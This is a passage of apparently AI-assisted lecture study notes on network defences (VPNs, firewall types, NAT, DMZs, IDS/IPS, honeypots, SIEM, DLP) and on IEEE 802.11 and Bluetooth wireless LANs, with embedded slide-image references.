    ![[Pasted image 20250429014635.png]]Similar VPN diagram showing remote users connecting via IPSec over TCP/IP through an ISP gateway to a Firewall/VPN server.]
    *   **Why Use VPNs? :**
        *   **Encryption:** Secures data on untrusted networks.
        *   **Privacy:** Hides user's real IP address (uses VPN server's IP). Makes tracking harder.
        *   **Security:** Protects against hackers/malware on public Wi-Fi. Secure browsing.
        *   **Bypassing Geo-restrictions:** Access content locked to specific regions by connecting through a server in that region.
        *   **Public Wi-Fi Security:** Encrypts data on inherently insecure public hotspots.
        *   **Anonymity:** Masks IP and encrypts traffic (though less anonymous than Tor). Important for journalists, activists, users under censorship.
    *   **VPN Applications (Slide 78):** Remote Access (corporate networks), Securing Public Wi-Fi, Bypassing Geo-restrictions, Enhancing Privacy, File Sharing/Torrenting (privacy/security), Circumventing Censorship, Online Gaming (reduce lag via specific routing, security), Secure Communication.

F.  **5. Firewalls**
       **Definition:** A device or software that **filters network traffic** between a protected ("inside") network and an untrusted ("outside") network based on a set of **security rules (policy)**. 
    *   **Goal:** Control access, prevent unauthorized traffic from entering or leaving the protected network.
    *   **Implementation:** Often dedicated hardware appliances for performance and security, but can be software. 
    *   **Reference Monitor Characteristics :** A good firewall should be:
        *   **Always invoked:** Cannot be bypassed.
        *   **Tamperproof:** Resistant to modification by attackers.
        *   **Small and simple enough for rigorous analysis:** Verifiable correctness.
    *   **Firewall Environments :** Can range from simple (single packet filter) to complex (multiple firewalls, proxies, DMZs).
    *   **Types of Firewalls :**
        *   **a) Packet Filtering Gateways (Screening Routers) :**
            *   Operate at **Network Layer (OSI Layer 3)**.
            *   Filter based on packet headers: **Source/Destination IP Address, Source/Destination Port, Protocol** (TCP, UDP, ICMP).
            *   **Stateless:** Each packet evaluated independently based on rules; no memory of past packets or connection state.
            *   *Pros:* Fast, low performance impact, relatively simple. (Slide 152)
            *   *Cons:* Cannot detect application-specific attacks, vulnerable to spoofing if rules are simple, cannot block attacks exploiting established connections if state isn't tracked.
            ![[Pasted image 20250429014836.png]] Sample firewall policy table with rules (Type, Source, Dest, Port, Action).
            ![[Pasted image 20250429014847.png]] Diagrams showing filtering based on protocol (HTTP vs Telnet) and source IP.
            ![[Pasted image 20250429014902.png]]Visual Cue : OSI diagram showing filtering at Layer 3.
        *   **b) Stateful Inspection Firewalls :**
            *   Operate primarily at **Transport Layer (OSI Layer 4)**, but aware of state.
            *   **Maintain state information** about active connections (e.g., TCP connection state).
            *   Allow return traffic automatically if it matches an established outgoing connection. Block unsolicited incoming traffic unless explicitly allowed.
            *   Can track packet sequences, connection status.
            *   *Pros:* More secure than stateless packet filters, better protection against certain spoofing/scan types.
            *   *Cons:* More resource-intensive than stateless, can still be complex to configure correctly, potentially vulnerable to DoS against the state table itself.
            ![[Pasted image 20250429014945.png]]
            Diagram implies state tracking by counting connections from an IP and blocking after a threshold.
             ![[Pasted image 20250429015131.png]] 
             (Note: Slide 158 text describes Stateful Multilayer, which combines this with Application level).
        *   **c) Application-Level Gateways (Proxies) (Slides 81, 86, 156-157):**
            *   Operate at **Application Layer (OSI Layer 7)**.
            *   Act as an **intermediary (proxy)** for specific applications (e.g., HTTP Proxy, FTP Proxy).
            *   Client connects to proxy -> Proxy connects to destination server on client's behalf.
            *   Can inspect **application payload** content, filter malicious commands/data, log activity, cache content.
            *   *Pros:* High level of security, deep inspection capabilities, good logging.
            *   *Cons:* Slower (more processing), requires a proxy for each application protocol, can break some applications if not configured properly.
               ![[Pasted image 20250429015154.png]] Diagram showing clients connecting to proxy, which filters, logs, caches, and then connects to internal servers.
               ![[Pasted image 20250429015220.png]]
               Visual Cue (Slide 157):* OSI diagram showing filtering at Layer 7.]
            *   *Real-World Example:* Web proxies used by companies to monitor/filter employee internet access .
        *   **d) Circuit-Level Gateways :**
            *   Operate at **Session Layer (OSI Layer 5)** or **TCP Layer (Transport)**.
            *   Monitor **TCP handshaking** to validate sessions. Once session is established, allows data to flow without further inspection (acts like a wire).
            *   Doesn't inspect application content. Hides internal network information.
            *   Often used to implement **VPNs**. 
            *   *Pros:* Faster than application proxies, hides internal topology.
            *   *Cons:* No application-level inspection.
               ![[Pasted image 20250429015241.png]] Diagram showing circuit gateway checking destination, potentially encrypting and passing traffic if allowed, bypassing main firewall for certain connections.
            ![[Pasted image 20250429015301.png]] OSI diagram showing filtering based on Layer 4 session initiation.
        *   **e) Guards:** Specialized high-assurance firewalls, often used in military/government settings to connect networks of different security levels. Complex functionality.
        *   **f) Personal / Host-Based Firewalls :**
            *   Software running on an individual computer (workstation/server).
            *   Filters traffic for that specific host.
            *   Can restrict traffic based on IP/port *and* by **application**.
            *   *Pros:* Protects individual host even within a trusted network, application-level control.
            *   *Cons:* Managed individually (can be burdensome), relies on host OS security.
            ![[Pasted image 20250429015343.png]] 
            Screenshot of Windows Firewall configuration dialog showing application/protocol exceptions.*
        *   **g) Stateful Multilayer Inspection Firewalls:** Combines packet filtering, stateful inspection, and application-level inspection. Most modern "Next-Generation Firewalls" (NGFW) fall into this category.
    *   **Firewall Comparison Summary:**
        ![[Pasted image 20250429015415.png]] Table comparing Packet Filter, Stateful, Application Proxy, Circuit Gateway, Guard, Personal Firewall across criteria like Simplicity, Speed, Functionality, Security Level, Transparency.
        ![[Pasted image 20250429015431.png]]
        Simplified performance summary table and diagrams showing trade-offs between Speed and Intelligence (Packet Filter: High Speed, Low Intel; App Proxy: Low Speed, High Intel; Stateful: Good balance).
    *   **What Firewalls Can and Cannot Do:**
        *   **Can:** Protect perimeter *if* they control *all* traffic; enforce policy.
        *   **Cannot:** Protect data *outside* the perimeter; protect against threats *inside* the perimeter (e.g., malicious insider, malware already inside); inherently protect against misconfiguration; fully control malicious *content* if the protocol/port is allowed (need other tools like antivirus).
        *   **Are:** Visible targets for attack; require correct & updated configuration; require log review.
    *   **Network Address Translation (NAT) (Slide 91):**
        *   Often performed by firewalls/routers.
        *   **Mechanism:** Translates private, internal IP addresses to a single (or pool of) public IP address(es) for traffic going to the internet. Keeps track of connections in a state table to route return traffic back to the correct internal host.
        *   **Security Benefit:** **Hides internal network structure** and IP addresses from the outside world. Prevents direct inbound connections to internal hosts unless explicitly configured (port forwarding).
        ![[Pasted image 20250429015512.png]] 
        Diagram showing internal host (192.168.1.35) sending packet, firewall changes source IP to its public IP (173.203.129.90) using NAT table, sends to destination (65.216.161.24), and reverses process for reply.*

G.  **6. Demilitarized Zones (DMZ)**
    *   **Concept:** A **buffer network** located between an untrusted external network (Internet) and a trusted internal network.
    *   **Purpose:** Host public-facing services (web, email, FTP servers) that need external access, while isolating them from the secure internal network.
    *   **Architecture:** Typically uses **two firewalls**:
        1.  External Firewall: Between Internet and DMZ. Filters traffic to DMZ servers.
        2.  Internal Firewall: Between DMZ and Internal Network. Strictly controls traffic from DMZ to Internal (often denying most/all initiated connections from DMZ).
    *   **Benefit:** If a DMZ server is compromised, the attacker does not have direct access to the internal network. Limits damage potential. (Slide 97)
    ![[Pasted image 20250429015544.png]]
    Diagram showing Internet -> Firewall -> DMZ (Web/Email/FTP Servers) -> Firewall -> Internal Network (Database).
    ![[Pasted image 20250429015603.png]]
    Visual Cue - Similar DMZ architecture diagram.
    *   *Variations:* More complex DMZs might have separate segments for different services, each with firewall rules.

---

### **VI. Intrusion Detection & Prevention Systems (IDS/IPS)**

A.  **Concept**
    *   **IDS:** Monitors network or system activities for **malicious actions or policy violations** and produces reports or alerts. Acts as an "alarm system". (Complementary to preventative controls like firewalls).
    *   **IPS:** An IDS with the capability to **actively block or prevent** detected intrusions in real-time.
    *   **Functions :** Monitor user/system activity, audit configurations, assess file integrity, recognize known attack patterns, identify anomalies (statistical analysis), manage audit trails, operate traps/honeypots.
    ![[Pasted image 20250429015642.png]] 
    Diagram showing IDS process: Raw Event Source -> Events (E) -> Analysis (A) -> Countermeasures (C) / Storage (S). Analysis uses known patterns/anomalies.*

B.  **Types of IDS/IPS 
    *   **Detection Method:**
        *   **Signature-based:** Matches activity against a database of known attack patterns (signatures). *Pro:* Accurate for known threats. *Con:* Cannot detect new/unknown (zero-day) attacks.
        *   **Heuristic / Anomaly-based:** Builds a baseline of normal behavior and flags significant deviations. *Pro:* Can detect novel attacks. *Con:* Prone to false positives (flagging legitimate but unusual activity).
    *   **Location:**
        *   **Network-based (NIDS/NIPS):** Monitors traffic on a network segment (using sensors/appliances).
        *   **Host-based (HIDS/HIPS):** Runs on an individual host, monitoring OS logs, system calls, file changes, network traffic *for that host*.
    *   **Scope:** (Covered by Location: Host vs Network)
    *   **Capability:**
        *   **Passive (IDS):** Detects and alerts only.
        *   **Active (IPS):** Detects, alerts, and takes action (e.g., block IP, terminate session, modify firewall rule).

---

### **VII. Supporting Security Technologies**

A.  **Honeypots**
    *   **Concept:** A **decoy system** designed to be intentionally attractive to attackers.
    *   **Purpose:**
        *   **Distraction:** Lure attackers away from production systems.
        *   **Intelligence Gathering:** Observe attacker methods, tools, and origins without risking real assets.
        *   **Early Warning:** Detect intrusion attempts.
    *   **Implementation:** Can range from low-interaction (emulating services) to high-interaction (real OS/apps in a contained environment). Often placed in DMZ or externally.
    ![[Pasted image 20250429015724.png]]Diagram shows honeypots placed externally, in the DMZ, and even mirroring internal systems, all designed to attract and log attacker activity.*

B.  **Security Information and Event Management (SIEM) (Slide 95)**
    *   **Concept:** Software systems that **aggregate and correlate log data** (security-relevant events) from various hardware/software sources (firewalls, IDS, servers, applications, etc.).
    *   **Purpose:** Provide a **unified view** and analysis platform for security monitoring, threat detection, incident response, and compliance reporting.
    *   **Benefit:** Enables correlation of events across different systems that would be impossible manually. Facilitates detection of complex/stealthy attacks.
    *   **Functionality:** Basic search/alerting to complex dashboards, custom reports, advanced correlation rules.
      ![[Pasted image 20250429015735.png]]
    Diagram shows log data from various sources (Cloud, DBs, Web Apps, Email, Firewalls, IDS, Routers) feeding into a central SIEM system for analysis by SOC (Security Operations Center) analysts.*

C.  **Data Loss Prevention (DLP)**
    *   **Concept:** Technologies designed to **detect and potentially prevent** attempts to exfiltrate (**send out**) sensitive data from the network/system.
    *   **Purpose:** Protect confidential information (PII, intellectual property, financial data) from unauthorized disclosure.
    *   **Implementation:** Can be network-based (monitoring egress traffic) or host-based (agent on endpoint). Can be implemented as 'Guards' (specialized filtering devices).
    *   **Detection Indicators:** Looks for keywords, data patterns (e.g., credit card numbers, SSNs), unusual traffic patterns, encoding/encryption attempts.
    *   **Effectiveness:** Best for preventing *accidental* data loss. Malicious users may find ways to circumvent DLP controls.

---


### **VIII. Summary & Key Takeaways (Slide 98)**

*   Networks face fundamental threats: **Interception, Modification, Fabrication, Interruption.**
*   **WPA2** (with AES) provides critical security advantages over the obsolete **WEP** for WiFi. Configure it properly!
*   **DoS/DDoS attacks** aim to disrupt availability, often using **volumetric** methods (flooding) or exploiting protocol/application **bugs/features**. Botnets are key enablers for DDoS.
*   **Network Encryption** is crucial:
    *   **Link Encryption:** Protects the physical link (Layer 1).
    *   **End-to-End Encryption:** Protects data content across networks (Layers 4-7).
    *   Tools: **VPNs, SSH, SSL/TLS** protocols implement these concepts.
*   **Firewalls** are essential perimeter defenses, filtering traffic based on policy. Many types exist (Packet Filter, Stateful, Proxy, etc.), operating at different OSI layers with varying capabilities. **NAT** is often a firewall function providing address hiding. **DMZs** use firewalls to isolate public services.
*   **IDS/IPS** monitor for intrusions (signature/anomaly based) and can alert (IDS) or actively block (IPS). Can be network (NIDS) or host (HIDS) based.
*   Other tools like **Honeypots, SIEMs, DLP** supplement defenses by providing threat intelligence, centralized monitoring/correlation, and data exfiltration controls.



# **Wireless LANs**

**Source:** Data Communications and Networking, Fourth Edition, Forouzan.
**Date:** [Insert Date]
**Lecture Topic:** Introduction to Wireless Local Area Networks (WLANs) focusing on IEEE 802.11 standards and Bluetooth.

---

## **14-1 IEEE 802.11 Standard**

*   **Definition:** The **IEEE 802.11** is a set of standards defined by the Institute of Electrical and Electronics Engineers (IEEE) for implementing Wireless Local Area Networks (WLANs).
*   **Scope:** These standards primarily cover the **Physical Layer** and the **Media Access Control (MAC) sublayer** of the Data Link Layer in the OSI model.
*   **Topics Covered:**
    1.  Architecture
    2.  MAC Sublayer
    3.  Physical Layer

`[🔗 Connection]: This builds upon previous lectures on the OSI model, specifically Layer 1 (Physical) and Layer 2 (Data Link). Compare/contrast with wired LAN standards like Ethernet (IEEE 802.3).`

---

### **A. IEEE 802.11 Architecture**

1.  **Stations (STAs):** Any device containing an IEEE 802.11 compliant MAC and PHY interface (e.g., laptops, smartphones, IoT devices).
2.  **Basic Service Set (BSS):** The fundamental building block of an 802.11 WLAN. Consists of a group of stations communicating wirelessly.
    *   **Types of BSS:**
        *   **Independent BSS (IBSS) / Ad hoc Network:**
            *   Consists of STAs communicating directly with each other (peer-to-peer) **without an Access Point (AP)**.
            *   Formation is spontaneous.
            *   `[🌍 Real-World Example/Application]: Quickly sharing files between laptops at a meeting without existing Wi-Fi; temporary networks for gaming.`
        *   **Infrastructure Network:**
            *   Consists of STAs communicating via an **Access Point (AP)**.
            *   The AP acts as a bridge, connecting the wireless STAs to a wired network infrastructure (the Distribution System).
            *   **This is the most common type of Wi-Fi network.**
            *   `[🌍 Real-World Example/Application]: Home Wi-Fi networks, university campus Wi-Fi, public hotspots in cafes.`
3.  **Access Point (AP):** A station that functions as a bridge between a wireless BSS and a wired network (Distribution System) or relays traffic between STAs within the BSS.
4.  **Distribution System (DS):** The backbone network connecting multiple APs, allowing STAs to roam between BSSs. Typically, this is a wired Ethernet LAN.
5.  **Extended Service Set (ESS):**
    *   A set of two or more BSSs interconnected by a Distribution System (DS).
    *   APs within an ESS communicate to facilitate roaming of STAs between BSSs.
    *   Appears as a single logical network to the LLC layer.
    *   ![[Pasted image 20250429021139.png]]shows multiple BSSs, each with an AP, connected via a central "Distribution System" which links to a Server/Gateway.


**[Section Takeaway]:** 802.11 networks are built from BSSs. An Ad hoc BSS is peer-to-peer, while an Infrastructure BSS uses an AP to connect stations, often linking to a wired network. Multiple BSSs form an ESS for broader coverage.

---

### **B. IEEE 802.11 MAC Sublayer**

*   **Position:** Sits above the Physical Layer and below the Logical Link Control (LLC) sublayer (often considered part of IEEE 802.2).
*   **Key Functions:** Controls access to the shared wireless medium, addressing, frame formatting, error checking.
* ![[Pasted image 20250429021226.png]]Layer diagram showing LLC, MAC sublayer (PCF, DCF), and Physical Layer variants (FHSS, DSSS, etc.)

1.  **Coordination Functions:**
    *   **Distributed Coordination Function (DCF):**
        *   **Primary access method**, mandatory in all 802.11 implementations.
        *   Uses **CSMA/CA (Carrier Sense Multiple Access with Collision Avoidance)**.
        *   **Contention-based:** Stations compete for access to the medium.
    *   **Point Coordination Function (PCF):**
        *   **Optional**, contention-free access method.
        *   Requires an AP acting as a **Point Coordinator (PC)**.
        *   Uses polling: The PC grants stations permission to transmit.
        *   Operates during **Contention-Free Periods (CFPs)** which alternate with **Contention Periods (CPs)** where DCF is used.
        *   Uses **PIFS (PCF Interframe Space)**, which is shorter than DIFS, giving it priority access.

2.  **CSMA/CA Mechanism (used by DCF):**
    *   **Goal:** Minimize the probability of collisions.
    *   **Steps:**
        1.  **Listen Before Talking (Carrier Sense):** Sense the medium. If idle, proceed. If busy, wait until idle.
        2.  **Interframe Spacing (IFS):** Wait for a specific period after the medium becomes idle before transmitting.
            *   **SIFS (Short IFS):** Highest priority, used for ACKs, CTS, Poll responses. Shortest wait time.
            *   **PIFS (PCF IFS):** Used by PCF for contention-free access. Medium priority (SIFS < PIFS).
            *   **DIFS (DCF IFS):** Used by DCF for contention-based data frames. Lowest priority (SIFS < PIFS < DIFS).
            *   `[💡 Mnemonic/Memory Aid]: **S**hortest **P**refers **D**ata (SIFS < PIFS < DIFS)`
        3.  **Random Backoff:** If the medium was busy or after a successful transmission using DIFS, wait for DIFS, then start a random backoff timer. The timer counts down only when the medium is idle. Transmit when the timer reaches zero.
            *   `[Brief Summary]: The random wait reduces the chance that multiple stations transmit simultaneously right after the medium becomes free.`
        4.  **Optional RTS/CTS Handshake:**
            *   **RTS (Request to Send):** Sent by the source station. Includes duration needed for frame + ACK.
            *   **CTS (Clear to Send):** Sent by the destination station in response. Also includes duration.
            *   **NAV (Network Allocation Vector):** Stations overhearing RTS or CTS set their NAV timer based on the duration field. They defer access until the NAV expires. This helps mitigate the **Hidden Station Problem**.
            ![[Pasted image 20250429021324.png]]Flowchart of CSMA/CA process including backoff, DIFS, RTS/CTS checks, SIFS, ACK checks.
            * ![[Pasted image 20250429021336.png]]Time sequence diagram showing Source sending RTS, Destination sending CTS after SIFS, Source sending Data after SIFS, Destination sending ACK after SIFS. Other stations set NAV based on RTS/CTS.
        5.  **Acknowledgement (ACK):** All unicast frames must be acknowledged by the receiver immediately after a SIFS interval. If no ACK is received, the sender assumes a collision or error occurred and retransmits after another backoff.

3.  **Frame Format:**
    *   **General Structure:**
    ![[Pasted image 20250429021357.png]]
        *   **FC (Frame Control - 2 bytes):** Contains various subfields defining the frame type and control information.
        *   **D (Duration/ID - 2 bytes):** Used for NAV calculation or Association ID.
        *   **Address Fields (6 bytes each):** Up to 4 address fields (MAC addresses). Their meaning depends on the `To DS` and `From DS` bits in the FC field.
        *   **SC (Sequence Control - 2 bytes):** Used for fragmentation and duplicate detection.
        *   **Address 4 (6 bytes):** Used only in specific cases like Wireless Distribution System (WDS) links between APs.
        *   **Frame Body (0-2312 bytes):** Payload (Data), or management/control information.
        *   **FCS (Frame Check Sequence - 4 bytes):** CRC-32 for error detection over the entire frame.
    *   **Frame Control (FC) Subfields:** 
        *   **Protocol Version:** Usually 0.
        *   **Type:** Management (00), Control (01), Data (10).
        *   **Subtype:** Further specifies frame type (e.g., RTS, CTS, ACK, Beacon, Data).
        *   **To DS / From DS:** Indicate if frame is going to/coming from the Distribution System (wired network via AP). Crucial for address interpretation. (See Addressing Mechanisms below).
        *   **More Frag:** Set to 1 if more fragments follow.
        *   **Retry:** Set to 1 if this is a retransmission.
        *   **Pwr Mgt:** Set to 1 if station is entering power-save mode.
        *   **More Data:** Set to 1 by AP if it has more buffered data for a station in power-save mode.
        *   **WEP:** Set to 1 if frame body is encrypted (legacy WEP). *Note: WPA/WPA2 are now standard.* 
        *   **Rsvd:** Reserved.
    *   **Control Frames:** Short frames for MAC coordination. 
    ![[Pasted image 20250429021507.png]]
        *   **RTS (Request to Send):** Contains FC, Duration, Address 1 (Receiver), Address 2 (Transmitter), FCS.
        *   **CTS (Clear to Send):** Contains FC, Duration, Address 1 (Receiver - originally the RTS sender), FCS.
        *   **ACK (Acknowledgement):** Contains FC, Duration, Address 1 (Receiver - sender of the frame being ACKed), FCS.
        ![[Pasted image 20250429021522.png]]

4.  **Addressing Mechanisms:** The interpretation of Address 1, 2, 3, (and 4) depends on the To DS / From DS bits.  ![[Pasted image 20250429021533.png]]
    *   **Case 1 (To DS=0, From DS=0):** Ad hoc network (STA <-> STA) or Mgmt/Control frames within a BSS.
        *   Addr1 = Destination Address (DA)
        *   Addr2 = Source Address (SA)
        *   Addr3 = BSSID (usually AP's MAC in infrastructure, random in ad hoc)
    *   **Case 2 (To DS=1, From DS=0):** Infrastructure network (STA -> AP -> DS).
        *   Addr1 = AP's MAC Address (Receiver)
        *   Addr2 = Sending STA's MAC Address (SA)
        *   Addr3 = Final Destination Address (DA) on the wired network
    *   **Case 3 (To DS=0, From DS=1):** Infrastructure network (DS -> AP -> STA).
        *   Addr1 = Receiving STA's MAC Address (DA)
        *   Addr2 = AP's MAC Address (Transmitter)
        *   Addr3 = Original Source Address (SA) from the wired network
    *   **Case 4 (To DS=1, From DS=1):** Wireless Distribution System (WDS) frame between APs.
        *   Addr1 = Receiving AP's MAC
        *   Addr2 = Sending AP's MAC
        *   Addr3 = Final Destination STA's MAC
        *   Addr4 = Original Source STA's MAC
    *   `[Brief Summary]: The four address fields flexibly handle direct STA-STA, STA-AP, AP-STA, and AP-AP communication scenarios by changing the meaning of the address fields based on the To/From DS flags.`
  

5.  **Hidden Station Problem:**
    *   **Problem:** Station B can communicate with AP (A), Station C can communicate with AP (A), but B and C cannot hear each other due to range or obstructions. If B sends to A, C might sense the medium as idle and also transmit, causing a collision at A. 
    ![[Pasted image 20250429021605.png]]
    *   **Solution:** **RTS/CTS Handshake.** B sends RTS to A. A broadcasts CTS. C hears the CTS (even if it didn't hear the RTS) and knows the medium will be busy, setting its NAV.
     ![[Pasted image 20250429021626.png]]

6.  **Exposed Station Problem:**
    *   **Problem:** Station B is transmitting to A. Station C wants to transmit to D. C is within range of B's transmission, so it senses the medium as busy and defers transmission to D, even though this transmission would likely *not* interfere with A's reception from B (since A is out of range of C, and D is out of range of B). This causes unnecessary waiting and reduces throughput. 
     ![[Pasted image 20250429021642.png]]Venn diagram showing ranges. B transmits to A. C is in B's range but A is not. C wants to transmit to D (outside B's range). C is "exposed" to B's transmission.]`
    *   **Handshaking Impact:** While RTS/CTS solves the hidden station problem, it doesn't inherently solve the exposed station problem and can sometimes make it slightly worse, as C might defer based on hearing B's RTS even if its own transmission wouldn't interfere. Figure 14.13 shows C being blocked and a potential collision if C *doesn't* defer correctly, but doesn't illustrate a solution. 
    * ![[Pasted image 20250429021653.png]]Shows B->A comms, C wants to send to D but is exposed to B's RTS. Another RTS/CTS from C->D might collide at D if timing is wrong or if D is also exposed.]`
    

**[Section Takeaway]:** The 802.11 MAC uses CSMA/CA (DCF) for contention-based access, employing IFS, random backoff, and optional RTS/CTS to avoid collisions, especially from hidden stations. PCF offers contention-free access via polling. Complex addressing and frame formats handle various network configurations.

---

### **C. IEEE 802.11 Physical Layer (PHY)**

*   Deals with encoding/decoding signals, modulation, and transmission/reception of bits over the air.
*   Several different PHY standards exist under the 802.11 umbrella, offering different speeds and capabilities.

1.  **Common Standards and Characteristics:** ![[Pasted image 20250429021713.png]]
    *   **Legacy 802.11 (1997):**
        *   **FHSS (Frequency Hopping Spread Spectrum):** 2.4 GHz ISM band, FSK modulation, 1 & 2 Mbps. Hops pseudo-randomly between narrow channels.
		![[Pasted image 20250429021742.png]]
        *   **DSSS (Direct Sequence Spread Spectrum):** 2.4 GHz ISM band, PSK modulation, 1 & 2 Mbps. Spreads signal over a wider channel using a chipping code (Barker sequence).  ![[Pasted image 20250429021754.png]]
        *   **Infrared:** Uses infrared light, PPM modulation, 1 & 2 Mbps. Limited range, requires line-of-sight.
         ![[Pasted image 20250429021804.png]]
    *   **802.11a (1999):**
        *   **OFDM (Orthogonal Frequency Division Multiplexing):** **5 GHz** band (less crowded). PSK or QAM modulation. **6 to 54 Mbps**. Not compatible with 802.11b/g due to frequency band.
    *   **802.11b (1999):**
        *   **HR-DSSS (High Rate DSSS) / CCK (Complementary Code Keying):** **2.4 GHz** ISM band. PSK modulation (CCK is a variant). **5.5 and 11 Mbps**. Backward compatible with legacy DSSS. ![[Pasted image 20250429021818.png]]
    *   **802.11g (2003):**
        *   **OFDM:** **2.4 GHz** ISM band. "Different" modulation (uses OFDM schemes similar to 802.11a). **Up to 54 Mbps**. Backward compatible with 802.11b.

2.  **ISM Bands:**
    *   **Industrial, Scientific, and Medical (ISM) Bands:** Unlicensed frequency bands used by WLANs, Bluetooth, microwaves, etc.
    ![[Pasted image 20250429021847.png]]
        *   ~902-928 MHz (26 MHz width) - Used by some cordless phones, early FHSS.
        *   **~2.400-2.4835 GHz (83.5 MHz width)** - **Heavily used by 802.11b/g/n/ax, Bluetooth, microwaves. Crowded.**
        *   **~5.725-5.850 GHz (125 MHz width)** - **Used by 802.11a/n/ac/ax. Less crowded (though more bands opened up around this range later).**
    *   `[🌍 Real-World Example/Application]: Interference issues in the 2.4 GHz band are common due to overlapping use by Wi-Fi, Bluetooth, and other devices.`

**[Section Takeaway]:** 802.11 has evolved through multiple physical layer standards using different techniques (FHSS, DSSS, OFDM), frequency bands (2.4 GHz, 5 GHz), modulations, and achieving progressively higher data rates. Understanding the characteristics of each standard (like band and speed) is crucial.

---

## **14-2 Bluetooth**

*   **Definition:** A **wireless LAN technology** designed for **short-range communication** (Personal Area Network - PAN) to connect devices of different functions (phones, headsets, keyboards, sensors, etc.).
*   **Key Characteristic:** Operates as an **ad hoc network**, meaning connections are formed spontaneously between devices when they come into range.
*   **Topics Covered:**
    1.  Architecture
    2.  Bluetooth Layers
    3.  Baseband Layer
    4.  L2CAP

`[🔗 Connection]: Contrast Bluetooth with IEEE 802.11: Both use 2.4 GHz ISM band (mostly), but Bluetooth is designed for lower power, shorter range, simpler connections between *devices*, while 802.11 is more for network *access* and higher throughput.`

---

### **A. Bluetooth Architecture**

1.  **Piconet:**
    *   The basic network structure in Bluetooth.
    *   Consists of **one Primary** node controlling the piconet.
    *   Can have up to **seven active Secondary** nodes communicating directly with the Primary.
    *   Many more (**up to 255**) Secondary nodes can be parked (inactive but synchronized).
    *   The Primary dictates the timing and hopping sequence.
    *   ![[Pasted image 20250429021914.png]]Diagram showing one central Primary laptop connected via wireless links to four Secondary laptops.
    *   `[🌍 Real-World Example/Application]: Connecting a wireless headset (Secondary) to a smartphone (Primary). Connecting a mouse and keyboard (Secondaries) to a computer (Primary).`
2.  **Scatternet:**
    *   Formed by connecting two or more piconets.
    *   A device can participate in multiple piconets simultaneously.
    *   A device can be a **Primary in one piconet** and a **Secondary in another**, or a **Secondary in multiple piconets**. Such devices act as bridges between piconets.
    *   Allows for more complex network topologies.
    ![[Pasted image 20250429021925.png]]Shows one piconet on the left. A device (labeled Primary/Secondary) acts as a Secondary in the left piconet and as the Primary for another piconet on the right.]


**[Section Takeaway]:** Bluetooth networks are ad hoc Piconets (1 Primary, up to 7 active Secondaries). Multiple Piconets can be linked into a Scatternet via shared devices.

---

### **B. Bluetooth Layers**

*   Bluetooth has its own protocol stack, distinct from the standard OSI/TCP-IP model but with analogous functions.
*   ![[Pasted image 20250429021940.png]]
    *   **Top:** Applications (implementing use cases)
    *   **Mid-Upper:** Profiles (define standard behaviors for specific applications, e.g., Headset Profile - HSP, Advanced Audio Distribution Profile - A2DP)
    *   **Middle:**
        *   **L2CAP (Logical Link Control and Adaptation Protocol):** Multiplexes upper-layer protocols, handles segmentation/reassembly, provides QoS flow control. Interfaces between upper layers and Baseband. Handles Data path.
        *   **Control:** Manages link setup, security, control functions.
        *   **Audio:** Specific handling for real-time audio streams (often bypassing L2CAP for lower latency).
    *   **Mid-Lower:** **Baseband Layer:** Manages physical channels, addressing, packet formats, timing, hopping sequence. Analogous to 802.11 MAC.
    *   **Bottom:** **Radio Layer:** Specifies details of air interface: frequency bands, modulation (GFSK), transmission power. Analogous to 802.11 PHY.

---

### **C. Bluetooth Baseband Layer**

*   Manages the physical links between devices within a piconet.
*   Uses **FHSS (Frequency Hopping Spread Spectrum)** in the 2.4 GHz ISM band.
    *   Typically hops across **79 channels**, each 1 MHz wide (fewer in some countries).
    *   Hops very rapidly (**1600 hops per second**) using a pseudo-random sequence determined by the Primary's clock and address. This provides resistance to interference and allows multiple piconets to co-exist.
*   Uses **TDD (Time Division Duplex):**
    *   Channel time is divided into **625 microsecond slots**.
    *   Primary transmits in **even-numbered slots** (0, 2, 4...).
    *   Secondaries transmit in **odd-numbered slots** (1, 3, 5...) **only immediately after being addressed** by the Primary in the preceding slot.
     ![[Pasted image 20250429022000.png]]**Single-secondary communication timing**. Primary sends in slot 0 (f0), Secondary replies in slot 1 (f0). Primary sends in slot 2 (f1), Secondary replies in slot 3 (f1). Hops occur between slot pairs.]`
     ![[Pasted image 20250429022017.png]]**Multi-secondary communication**. Primary sends to Secondary 1 in slot 0 (f0). Secondary 1 replies in slot 1 (f0). Primary sends to Secondary 2 in slot 2 (f1). Secondary 2 replies in slot 3 (f1). The Primary polls each secondary it wants to communicate with.]`
*   **Frame Format Types:**
![[Pasted image 20250429022037.png]]
    *   **Structure:** `Access Code (72 bits) | Header (54 bits) | Data (0 to N bits)`
    *   **Access Code:** Used for synchronization, DC offset compensation, and piconet identification. Derived from the Primary's identity.
    *   **Header:**
        *   Contains Address (3 bits for active Secondary - limits active Secondaries to 7, address 0 is broadcast), Type code (frame type), F (Flow control), A (ARQ - acknowledgement), S (Sequence number), HEC (Header Error Check - 8 bits).
        *   **Robustness:** The 18 significant bits of the header (Address, Type, F, A, S) are **repeated 3 times** (total 54 bits) with FEC for error resilience.
    *   **Data Payload (N bits):**
        *   Can occupy 1, 3, or 5 time slots.
        *   Max payload depends on frame type and slot usage (e.g., up to 2740 bits for a 5-slot packet).

**[Section Takeaway]:** The Bluetooth Baseband layer uses fast FHSS and TDD for robust, short-range communication within a piconet. The Primary controls timing and polling. Frames have a robust header and variable-length data payload.

---

### **D. Bluetooth L2CAP Layer**

*   **Logical Link Control and Adaptation Protocol.**
*   Operates above the Baseband layer.
*   **Functions:**
    *   **Protocol Multiplexing:** Allows multiple different upper-layer protocols (like SDP, RFCOMM, BNEP) to share a single Baseband link.
    *   **Segmentation and Reassembly:** Breaks large packets from upper layers into smaller Baseband packets and reassembles them at the receiving end. Max L2CAP payload is 65,535 bytes.
    *   **Quality of Service (QoS):** Manages QoS parameters per logical channel.
*   **L2CAP Packet Format:** 
* ![[Pasted image 20250429022055.png]]
    *   **Length (2 bytes):** Specifies the size of the Data field in bytes.
    *   **Channel ID (CID - 2 bytes):** Identifies the logical channel (protocol or service) the packet belongs to. Specific CIDs are reserved for signaling.
    *   **Data and Control (0 to 65,535 bytes):** The payload from the upper layer protocols.

**[Section Takeaway]:** L2CAP provides crucial adaptation services, allowing various applications and protocols to run efficiently over the underlying Bluetooth Baseband connection by handling multiplexing and segmentation.


Okay, processing the new set of slides on Firewalls and Network Security Threats. Here are the integrated notes:


# **Firewalls & Threats**

### **A. Introduction to Firewalls**

*   **Core Function:** Firewalls are security mechanisms designed to **control the flow of network traffic** between networks or network segments (e.g., between a private network and the Internet, or between internal departments).
*   **Versatility:**
